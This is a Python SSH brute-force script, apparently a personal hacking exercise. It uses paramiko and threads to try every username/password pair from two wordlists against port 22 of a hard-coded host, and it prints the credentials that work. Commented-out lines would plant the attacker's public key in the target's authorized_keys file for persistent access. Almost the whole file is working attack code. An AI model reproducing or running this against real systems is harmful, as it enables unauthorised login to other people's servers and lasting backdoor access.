# ssh 爆破
import queue
import threading
import paramiko

HOST = "10.211.55.17"
MAX_THREADS = 5
USER_FILE = "./name_top.txt"
PASS_FILE = "./pass_top.txt"
FOUNDED = False
POOL = threading.Semaphore(value = MAX_THREADS)


def connect(hostname,username,passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=hostname,port=22,username=username,password=passwd,look_for_keys=False,allow_agent=False,timeout=5)
        print(f"[ success ]{username} {passwd}")              
    except:
        print(f"[ x ] {username} {passwd} ")
        return False 
    finally:
        ssh.close()
    # rsa = id_rsaRead()
    # strin,stdout,stderr = ssh.exec_command(f"echo '{rsa}' >> ~/.ssh/authorized_keys")
    # print(stdout.read())
    
    
    return True

def build_wordlist(resume = None):
    try:
        words = queue.Queue()
        with open(USER_FILE,'r') as f:
            raw_word1s = f.read()
            f.close()
        
        with open(PASS_FILE,'r') as f:
            raw_word2s = f.read()
            f.close()
        
        found_resume = False
        for i in raw_word1s.split():
            for j in raw_word2s.split():
                output = [i,j]
                words.put(output)
            
    except Exception as e:
        print(e)
    finally:
        return words
    

def id_rsaRead(path = '/Users/mac/.ssh/id_rsa.pub'):
    #保存我的ssh密钥
    try:
        with open(path,'r') as f:
            buffer = f.read()
            f.close()
            return buffer

    except Exception as e:
        print(e)


def run():
    
    user_queue = build_wordlist()
    
    while not user_queue.empty():
        user = user_queue.get()
        username = user[0]
        userpass = user[1]
        POOL.acquire()
        t = mythread(username,userpass)
        t.start()
        # input("press enter to continue")
        if(FOUNDED):
            break
        # time.sleep(1)
        
    print("END")
    
        
class mythread(threading.Thread):
    def __init__(self,username,userpass):
        threading.Thread.__init__(self)
        self.username = username
        self.userpass = userpass
        self._stop_event = threading.Event()

    def run(self):
        global FOUNDED
        self.result = connect(HOST,self.username,self.userpass)
        # print(self.getName())
        if(self.result):
            FOUNDED = True
        POOL.release()
      
       
    def stop(self):
        self._stop_event.set()
    
    def getresult(self):
        return self.result

if __name__ == "__main__":
    run()
    
    # ssh = paramiko.SSHClient()
    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # ssh.connect(hostname=HOST,port=22,username="ubuntu",password="ubuntu123")
    # connect(HOST,"ubuntu123","ubuntu123")
